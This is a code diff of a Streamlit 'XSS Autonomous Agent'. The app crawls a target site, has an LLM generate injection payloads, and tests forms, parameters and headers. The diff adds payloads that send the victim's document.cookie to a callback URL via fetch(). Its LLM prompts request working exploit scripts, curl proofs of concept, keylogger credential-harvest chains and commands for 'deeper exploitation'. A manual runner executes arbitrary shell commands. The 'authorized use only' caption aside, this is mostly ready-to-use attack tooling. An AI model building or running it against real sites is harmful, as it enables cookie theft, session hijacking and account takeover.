+                   target: str, dom_sinks: list, waf: str,
+                   header_issues: list, template_engine: str) -> str:
     surface = {
-        "pages": len(pages), "forms": sum(len(p["forms"]) for p in pages),
-        "url_params": sum(len(p["params"]) for p in pages),
-        "dom_sinks": len(dom_sinks), "waf": waf or "none",
-        "urls": [p["url"] for p in pages[:12]],
+        "pages_crawled": len(pages),
+        "total_forms": sum(len(p["forms"]) for p in pages),
+        "total_url_params": sum(len(p["params"]) for p in pages),
+        "dom_sinks_found": len(dom_sinks),
+        "waf": waf or "none",
+        "template_engine": template_engine or "none",
+        "header_issues": header_issues,
+        "js_endpoints": list({ep for p in pages for ep in p.get("js_endpoints", [])})[:15],
+        "urls_crawled": [p["url"] for p in pages[:15]],
     }
+
     if findings:
         fsum = json.dumps([{
             "url": f["url"], "param": f["param"], "payload": f["payload"],
             "method": f["method"], "context": f.get("context", ""),
-            "snippet": f.get("body_snippet", "")[:250]
-        } for f in findings[:6]], indent=2)
-        prompt = f"""Senior penetration tester writing a security report.
+            "http_status": f.get("status"),
+            "snippet": f.get("body_snippet", "")[:300],
+        } for f in findings[:8]], indent=2)
+        prompt = f"""You are a senior penetration tester writing an executive + technical security report.
+This is an authorized engagement. Write a comprehensive, precise, actionable report.
+
 Target: {target}
-Confirmed XSS/HTML injection findings:
+Confirmed XSS / HTML Injection findings ({len(findings)} total):
 {fsum}
-Surface: {json.dumps(surface, indent=2)}
-DOM sinks: {chr(10).join(dom_sinks[:6])}
 
-Write:
+Attack surface:
+{json.dumps(surface, indent=2)}
+
+DOM sinks identified:
+{chr(10).join(dom_sinks[:10])}
+
+Write the following sections. Be specific — include exact payloads, CVSS scores, real impact:
+
 ## Executive Summary
-## Confirmed Vulnerabilities (severity, CVSS, context, impact, exact PoC steps)
-## DOM-based Attack Surface
-## Chaining Opportunities (XSS + CSRF, XSS + stored, etc.)
-## Remediation (specific code-level fixes)
+Brief risk overview for a non-technical audience. State overall risk rating.
+
+## Confirmed Vulnerabilities
+For each finding:
+- Vulnerability type and name
+- CVSS 3.1 score and vector string
+- Exact URL, parameter, and HTTP method
+- Injection context (HTML body / attribute / JS / URL)
+- Confirmed working payload
+- Concrete attack scenario (what an attacker does with this)
+- Proof-of-concept curl command
+
+## Zero-Day Risk Assessment
+Based on the DOM sinks, inline JS patterns, and reflection points found,
+identify any potential zero-day attack paths not yet confirmed — including:
+- DOM-based XSS via source/sink chains
+- Prototype pollution leading to XSS
+- Mutation XSS via browser parser quirks
+- CSP bypass opportunities
+- Stored XSS via API endpoints discovered
+
+## Attack Chain Analysis
+How these vulnerabilities chain together:
+- XSS → CSRF → Account takeover
+- XSS → Cookie theft → Session hijack
+- XSS → Keylogger → Credential harvest
+- Clickjacking combinations
+
+## Header & Configuration Issues
+Security header analysis with risk ratings.
+
+## Remediation (Priority Order)
+Specific, code-level fixes. Include exact code snippets for the fix.
+
 ## Next Steps
-Technical, precise, actionable."""
+Specific curl/Python commands to run for deeper exploitation."""
+
     else:
-        prompt = f"""Senior penetration tester. No direct reflections found. Write targeted next steps.
+        dom_chain = "\n".join(dom_sinks[:12])
+        prompt = f"""You are a senior penetration tester. No direct reflections were confirmed via GET/POST testing.
+This does NOT mean the target is secure — write a thorough analysis of remaining attack surface.
+
 Target: {target}
-Surface: {json.dumps(surface, indent=2)}
-DOM sinks found: {chr(10).join(dom_sinks[:8])}
+Attack surface:
+{json.dumps(surface, indent=2)}
+
+DOM sinks found (HIGH VALUE — may be exploitable):
+{dom_chain}
+
 WAF: {waf or 'none'}
+Template engine: {template_engine or 'unknown'}
 
 Write:
-## Surface Map (what was found)
-## Why Payloads Missed (WAF? SPA? sanitisation?)
-## Blind XSS Attack Plan (specific payloads + endpoints to try)
-## DOM-based XSS Plan (based on sinks above)
-## Stored XSS Vectors (which forms to focus on)
-## Manual Curl Commands to Run Next
-Include actual payload examples."""
+
+## Attack Surface Map
+What was discovered. Highlight highest-value targets.
+
+## Why Automated Testing Missed (Root Cause Analysis)
+- SPA / JavaScript-rendered content not visible to crawler?
+- WAF blocking payloads?
+- Authentication required?
+- POST-only endpoints?
+- JSON/GraphQL API requiring specific content-type?
+- Stored XSS (payloads stored, not immediately reflected)?
+
+## DOM-based XSS Attack Plan
+For each DOM sink found, write the specific attack:
+- Which source feeds this sink (location.hash, document.URL, etc.)
+- Exact payload to use
+- Manual test steps
+
+## Zero-Day Hunt Targets
+Specific locations in the code/DOM where a zero-day is most likely to exist.
+For each: exact URL, parameter/sink, payload family to try.
+
+## Blind XSS Attack Plan
+Which forms and parameters to target with blind XSS payloads.
+Include exact payloads with webhook callback.
+
+## Manual curl / Python Commands
+Specific commands to copy-paste and run next."""
 
     try:
         resp = client.chat.completions.create(
-            model=MODEL,
+            model=MODEL_DEEP,
             messages=[{"role": "user", "content": prompt}],
-            max_tokens=MAX_TOKENS, temperature=0.2,
+            max_tokens=MAX_TOKENS,
+            temperature=0.2,
         )
         return resp.choices[0].message.content
     except Exception as e:
-        return f"Error: {e}"
+        return f"Error generating report: {e}"
 
 
 # ── Agent orchestrator ────────────────────────────────────────────────────────
 def run_agent(target: str, user_payload: str, max_depth: int,
-              term_ph, stats_phs):
-    """Runs all 5 phases; updates term_ph and stats_phs live throughout."""
+              blind_url: str, term_ph, stats_phs):
     client = get_client()
 
     def L(msg, kind="info"):
         log(msg, kind, term_ph, stats_phs)
 
-    L(f"Target : {target}")
-    L(f"Payload: {user_payload}")
-    L(f"Depth  : {max_depth}")
-    L("━" * 44)
+    L(f"Target  : {target}")
+    L(f"Payload : {user_payload}")
+    L(f"Depth   : {max_depth}")
+    if blind_url:
+        L(f"Blind   : {blind_url}", "blind")
+    L("━" * 46)
 
-    # Phase 1 — Crawl
+    # ── Phase 1: Crawl & Recon ─────────────────────────────────────────────
     L("PHASE 1 — CRAWL & RECON", "info")
     pages = crawl(target, max_depth, term_ph, stats_phs)
     L(f"Crawl done — {len(pages)} pages | "
@@ -545,75 +892,109 @@ def run_agent(target: str, user_payload: str, max_depth: int,
     all_sinks = []
     for p in pages:
         all_sinks.extend(p.get("dom_sinks", []))
-    st.session_state.dom_sinks = all_sinks[:20]
+    all_sinks = list(dict.fromkeys(all_sinks))[:25]
+    st.session_state.dom_sinks = all_sinks
+
     if all_sinks:
-        L(f"DOM sinks: {len(all_sinks)} found", "dom")
-        for s in all_sinks[:4]:
-            L(f"  {s[:100]}", "dom")
+        L(f"DOM sinks detected: {len(all_sinks)}", "dom")
+        for s in all_sinks[:6]:
+            L(f"  {s[:110]}", "dom")
 
     resp0 = safe_req("get", target)
     waf = detect_waf(resp0)
     st.session_state.waf_detected = waf
     L(f"WAF: {waf if waf else 'none detected'}", "warn" if waf else "ok")
 
+    header_issues = []
     if pages:
-        for issue in _analyze_headers(pages[0]["headers"]):
+        header_issues = _analyze_headers(pages[0]["headers"])
+        for issue in header_issues:
             L(issue, "warn")
 
-    eng, ssti = _detect_template_engine(pages)
+    eng, ssti_payloads = _detect_template_engine(pages)
     if eng:
         L(f"Template engine: {eng} — SSTI payloads added", "warn")
 
-    # Phase 2 — Payload gen
-    L("━" * 44)
-    L("PHASE 2 — AI PAYLOAD GENERATION", "ai")
-    context = ""
-    for p in pages[:6]:
-        if p["forms"] or p["params"] or p["dom_sinks"]:
-            context += f"\n--- {p['url']} ---\n{p['html'][:1200]}\n"
-    payloads = ai_generate_payloads(
-        client, target, user_payload, context, waf, all_sinks, eng)
-    payloads += ssti[:3]
-    L(f"Generated {len(payloads)} context-aware payloads", "ai")
-    for i, pl in enumerate(payloads[:6], 1):
-        L(f"  [{i}] {pl[:90]}", "cmd")
+    # JS API endpoints
+    all_endpoints = list({ep for p in pages for ep in p.get("js_endpoints", [])})
+    if all_endpoints:
+        L(f"JS/API endpoints discovered: {len(all_endpoints)}", "dom")
+        for ep in all_endpoints[:4]:
+            L(f"  {ep}", "cmd")
 
-    # Phase 3 — Testing
-    L("━" * 44)
+    # ── Phase 2: AI Payload Generation ────────────────────────────────────
+    L("━" * 46)
+    L("PHASE 2 — AI PAYLOAD GENERATION (fast model)", "ai")
+    payloads = ai_generate_payloads(
+        client, target, user_payload, "", waf, all_sinks, eng, pages)
+
+    # Add SSTI, blind XSS, and base payloads not in AI list
+    payloads += ssti_payloads[:5]
+    if blind_url:
+        payloads.insert(0,
+            f'<img src=x onerror=fetch("{blind_url}?c="+document.cookie)>')
+        payloads.insert(1,
+            f'"><img src=x onerror=fetch("{blind_url}?c="+document.cookie)>')
+        payloads.insert(2,
+            f"'><script>fetch('{blind_url}?c='+document.cookie)</script>")
+
+    # De-duplicate while preserving order
+    seen = set()
+    unique_payloads = []
+    for p in payloads:
+        if p not in seen:
+            seen.add(p)
+            unique_payloads.append(p)
+    payloads = unique_payloads
+
+    L(f"Generated {len(payloads)} context-aware payloads", "ai")
+    for i, pl in enumerate(payloads[:8], 1):
+        L(f"  [{i}] {pl[:100]}", "cmd")
+
+    # ── Phase 3: Injection Testing ─────────────────────────────────────────
+    L("━" * 46)
     L("PHASE 3 — INJECTION TESTING", "info")
     all_findings = []
-    total_pts = 0
+
     for page in pages:
-        pts = len(page.get("params", [])) + sum(
-            len(f.get("fields", [])) for f in page.get("forms", []))
-        total_pts += pts
         hits = test_page(page, payloads, term_ph, stats_phs)
         all_findings.extend(hits)
-    st.session_state.points_found = total_pts
+
+    # Header injection test on main target
+    L("Testing HTTP header injection...", "info")
+    header_hits = _test_header_injection(target)
+    if header_hits:
+        all_findings.extend(header_hits)
+        st.session_state.vulns_found += len(header_hits)
+        for h in header_hits:
+            L(f"VULN [Header injection] {h['param']}", "vuln", term_ph, stats_phs)
+
     st.session_state.findings = all_findings
-    L(f"Tested {total_pts} injection points | "
+    L(f"Tested {st.session_state.points_found} injection points | "
       f"{len(all_findings)} confirmed vuln(s)", "ok")
 
-    # Phase 4 — Exploit
+    # ── Phase 4: Exploit Generation ───────────────────────────────────────
     if all_findings:
-        L("━" * 44)
+        L("━" * 46)
         L("PHASE 4 — EXPLOIT GENERATION", "ai")
-        exploit = ai_write_exploit(client, all_findings, target)
+        exploit = ai_write_exploit(client, all_findings, target, blind_url)
         st.session_state.exploit_code = exploit
-        L("Custom Python exploit written", "ok")
+        L("Python exploit script generated", "ok")
 
-    # Phase 5 — Report
-    L("━" * 44)
+    # ── Phase 5: Deep Report ───────────────────────────────────────────────
+    L("━" * 46)
     L("PHASE 5 — AI SECURITY REPORT", "ai")
-    report = ai_full_report(client, all_findings, pages, target, all_sinks, waf)
+    report = ai_full_report(
+        client, all_findings, pages, target,
+        all_sinks, waf, header_issues, eng)
     st.session_state.report = report
     L("Report complete", "ok")
-    L("━" * 19 + " DONE " + "━" * 19, "ok")
+    L("━" * 20 + " DONE " + "━" * 20, "ok")
     st.session_state.done = True
     st.session_state.running = False
 
 
-# ═══════════════════════════════════ UI ══════════════════════════════════════
+# ═══════════════════════════════════ UI ═══════════════════════════════════════
 st.markdown("""
 <style>
 .terminal {
@@ -623,7 +1004,7 @@ st.markdown("""
     font-size: 12.5px;
     padding: 16px;
     border-radius: 8px;
-    height: 420px;
+    height: 460px;
     overflow-y: auto;
     white-space: pre-wrap;
     border: 1px solid #238636;
@@ -635,7 +1016,7 @@ st.markdown("""
 st.title("🕷️ XSS Autonomous Agent")
 st.caption("Authorized use only — only test systems you own or have explicit written permission to test.")
 
-# ── Mission config ────────────────────────────────────────────────────────────
+# ── Mission config ─────────────────────────────────────────────────────────────
 with st.container(border=True):
     st.subheader("🎯 Mission")
     c1, c2 = st.columns([3, 1])
@@ -644,7 +1025,7 @@ with st.container(border=True):
                                       value=st.session_state._last_target,
                                       placeholder="https://your-test-site.com")
     with c2:
-        depth_input = st.slider("Crawl depth", 1, 4,
+        depth_input = st.slider("Crawl depth", 1, 5,
                                  int(st.session_state._last_depth))
 
     payload_input = st.text_area(
@@ -653,6 +1034,14 @@ with st.container(border=True):
         placeholder='<script>alert("owned")</script>  or  <img src=x onerror=fetch("https://myserver/?c="+document.cookie)>',
         height=72,
     )
+
+    blind_input = st.text_input(
+        "Blind XSS callback URL (optional)",
+        value=st.session_state._last_blind_url,
+        placeholder="https://your-webhook.site/callback — leave blank to skip",
+        help="Payloads will exfiltrate cookies/DOM to this URL for blind XSS detection",
+    )
+
     ca, cb = st.columns([2, 1])
     with ca:
         start_btn = st.button("🚀 Launch Agent", type="primary",
@@ -662,42 +1051,44 @@ with st.container(border=True):
         if st.button("🗑️ Reset", use_container_width=True):
             for k, v in defaults.items():
                 st.session_state[k] = v
-            st.session_state.report = ""
             st.rerun()
 
-# ── Stats row (placeholders so they can be updated mid-run) ──────────────────
+# ── Stats row ─────────────────────────────────────────────────────────────────
 sc = st.columns(5)
 s_phs = tuple(col.empty() for col in sc)
 _render_stats(*s_phs)
 
-# ── Terminal (placeholder so it can be updated mid-run) ──────────────────────
+# ── Terminal ──────────────────────────────────────────────────────────────────
 st.subheader("💻 Agent Terminal")
 term_ph = st.empty()
 term_ph.markdown(_render_terminal(), unsafe_allow_html=True)
 
-# ── Results tabs ─────────────────────────────────────────────────────────────
-tab1, tab2, tab3 = st.tabs(["📊 Findings & Report", "💻 Exploit Code", "🔍 Manual Terminal"])
+# ── Results tabs ──────────────────────────────────────────────────────────────
+tab1, tab2, tab3, tab4 = st.tabs([
+    "📊 Findings & Report", "💻 Exploit Code",
+    "🔬 DOM Sinks", "🖥️ Manual Terminal"
+])
 
 with tab1:
     if st.session_state.findings:
-        st.error(f"🚨 {len(st.session_state.findings)} confirmed injection(s)")
+        st.error(f"🚨 {len(st.session_state.findings)} confirmed injection(s) found")
         for i, f in enumerate(st.session_state.findings, 1):
-            with st.expander(
-                    f"#{i} [{f.get('context','?')}] {f['url']} — {f['param']}",
-                    expanded=(i == 1)):
+            label = f"#{i} [{f.get('context','?')}] {f['url']} — param: {f['param']}"
+            with st.expander(label, expanded=(i == 1)):
                 st.code(f["payload"], language="html")
-                st.markdown(
-                    f"**URL:** `{f['url']}`  \n**Param:** `{f['param']}`  \n"
-                    f"**Method:** `{f['method'].upper()}`  \n"
-                    f"**Context:** `{f.get('context','?')}`  \n"
-                    f"**HTTP:** `{f.get('status','?')}`")
+                cols = st.columns(2)
+                with cols[0]:
+                    st.markdown(
+                        f"**URL:** `{f['url']}`  \n"
+                        f"**Param:** `{f['param']}`  \n"
+                        f"**Method:** `{f['method'].upper()}`")
+                with cols[1]:
+                    st.markdown(
+                        f"**Context:** `{f.get('context','?')}`  \n"
+                        f"**HTTP status:** `{f.get('status','?')}`  \n"
+                        f"**Partial match:** `{f.get('partial', False)}`")
                 if f.get("body_snippet"):
                     st.code(f["body_snippet"], language="html")
-
-    if st.session_state.dom_sinks:
-        st.subheader("🔬 DOM Sinks")
-        for s in st.session_state.dom_sinks[:10]:
-            st.code(s, language="javascript")
 
     if st.session_state.get("report"):
         st.divider()
@@ -709,16 +1100,40 @@ with tab1:
 
 with tab2:
     if st.session_state.exploit_code:
-        st.subheader("🔧 AI-Written Exploit")
+        st.subheader("🔧 AI-Generated Exploit")
         st.code(st.session_state.exploit_code, language="python")
-        st.download_button("⬇️ exploit.py", st.session_state.exploit_code,
+        st.download_button("⬇️ Download exploit.py",
+                           st.session_state.exploit_code,
                            file_name="exploit.py", mime="text/plain")
     else:
-        st.info("Exploit code appears here when a vulnerability is confirmed.")
+        st.info("Exploit script appears here after a vulnerability is confirmed.")
 
 with tab3:
+    if st.session_state.dom_sinks:
+        st.subheader(f"🔬 DOM Sinks ({len(st.session_state.dom_sinks)} found)")
+        st.caption("These JavaScript patterns process user-controllable data — prime targets for DOM-based XSS.")
+        for s in st.session_state.dom_sinks:
+            st.code(s, language="javascript")
+    else:
+        st.info("DOM sinks appear here after a scan.")
+
+with tab4:
     st.subheader("Manual Command Runner")
-    mc = st.text_input("Command", placeholder="curl -sIL https://target.com")
+    mc = st.text_input("Command",
+                        placeholder="curl -sIL https://target.com  |  nmap -sV target.com")
+    presets = {
+        "Headers": "curl -sIL {TARGET}",
+        "CSP check": "curl -sI {TARGET} | grep -i content-security",
+        "Cookies": "curl -sIL {TARGET} | grep -i set-cookie",
+        "WAF probe": 'curl -s "{TARGET}?q=<script>alert(1)</script>" -o /dev/null -w "%{{http_code}}"',
+        "DOM dump": "curl -sL {TARGET} | grep -oP '(?<=innerHTML|outerHTML|document\\.write).{0,80}'",
+    }
+    if target_input:
+        pcols = st.columns(len(presets))
+        for i, (label, cmd) in enumerate(presets.items()):
+            with pcols[i]:
+                if st.button(label, use_container_width=True):
+                    mc = cmd.replace("{TARGET}", target_input)
     if st.button("▶ Run") and mc.strip():
         with st.spinner("Running..."):
             try:
@@ -731,7 +1146,7 @@ with tab3:
                 out = f"[ERROR] {e}"
         st.code(out, language="bash")
 
-# ── Launch logic ──────────────────────────────────────────────────────────────
+# ── Launch logic ───────────────────────────────────────────────────────────────
 if start_btn:
     if not target_input.strip():
         st.warning("Enter a target URL.")
@@ -741,17 +1156,27 @@ if start_btn:
         st.session_state._last_target = target_input.strip()
         st.session_state._last_payload = payload_input.strip()
         st.session_state._last_depth = depth_input
+        st.session_state._last_blind_url = blind_input.strip()
         st.session_state.running = True
         st.session_state.done = False
         st.session_state.log = []
+        st.session_state.findings = []
+        st.session_state.dom_sinks = []
+        st.session_state.pages_crawled = 0
+        st.session_state.points_found = 0
+        st.session_state.vulns_found = 0
+        st.session_state.exploit_code = ""
+        st.session_state.report = ""
+        st.session_state.waf_detected = ""
         st.rerun()
 
-# ── Run agent synchronously with live UI updates ──────────────────────────────
+# ── Run agent ──────────────────────────────────────────────────────────────────
 if st.session_state.running and not st.session_state.done:
     run_agent(
         st.session_state._last_target,
         st.session_state._last_payload,
         int(st.session_state._last_depth),
+        st.session_state._last_blind_url,
         term_ph,
         s_phs,
     )
